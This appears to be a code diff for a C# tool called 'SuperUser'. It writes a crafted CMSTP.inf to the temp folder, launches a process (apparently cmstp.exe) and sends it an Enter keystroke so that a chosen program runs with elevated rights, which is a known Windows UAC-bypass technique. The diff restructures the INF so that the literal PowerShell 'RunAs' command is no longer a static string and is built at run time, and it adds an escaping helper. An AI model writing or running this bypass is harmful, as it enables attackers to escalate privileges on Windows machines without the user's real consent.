@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -37,6 +38,29 @@ namespace SuperUser
 
         #endregion
 
+        #region Settings
+
+        private static readonly List<string> Settings = new List<string>
+        {
+            "[version]",
+            "Signature=$chicago$",
+            "AdvancedINF=2.5",
+            "[DefaultInstall]",
+            "CustomDestination=CustInstDestSectionAllUsers",
+            "RunPreSetupCommands = RunPreSetupCommandsSection",
+            "[RunPreSetupCommandsSection]",
+            "taskkill /IM cmstp.exe /F",
+            "[CustInstDestSectionAllUsers]",
+            "49000,49001=AllUSer_LDIDSection, 7",
+            "[AllUSer_LDIDSection]",
+            @" ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """" ",
+            "[Strings]",
+            "ServiceName=\"SuperUser\"",
+            "ShortSvcName=\"SuperUser\""
+        };
+
+        #endregion
+
         private const int Timeout = 100;
 
         public static bool IsAdministrator()
@@ -52,27 +76,10 @@ namespace SuperUser
 
         private static async Task Process(string filename, string program)
         {
-            string ini = $@"
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
-[RunPreSetupCommandsSection]
-powershell.exe ""Start-Process {filename} -Args '{program}' -Verb RunAs""
-taskkill /IM cmstp.exe /F
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-[AllUSer_LDIDSection]
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-[Strings]
-ServiceName=""SuperUser""
-ShortSvcName=""SuperUser""
-";
-
+            string procPaths = $@"""{filename}"" ""{program}""";
+            Settings.Insert(7, procPaths);
             string settings = Path.Combine(Path.GetTempPath(), "CMSTP.inf");
-            File.WriteAllText(settings, ini);
+            File.WriteAllText(settings, string.Join("\n", Settings));
 
             using (Process p = new Process())
             {
@@ -94,6 +101,11 @@ ShortSvcName=""SuperUser""
                     PostMessage(p.MainWindowHandle, WmKeydown, VkReturn, 0);
                 }
             }
+        }
+
+        private static string PowershellWhitespace(string text)
+        {
+            return text.Replace(" ", "` ");
         }
     }
 }
